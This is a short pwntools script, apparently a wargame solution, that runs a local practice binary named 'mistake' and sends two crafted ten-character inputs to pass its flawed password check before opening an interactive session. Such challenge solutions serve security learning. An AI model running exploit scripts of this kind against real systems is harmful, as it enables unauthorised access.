import time
from pwn import *
r=process("./mistake")
time.sleep(5)
r.sendline('0'*10)
r.sendline('1'*10)
r.interactive()
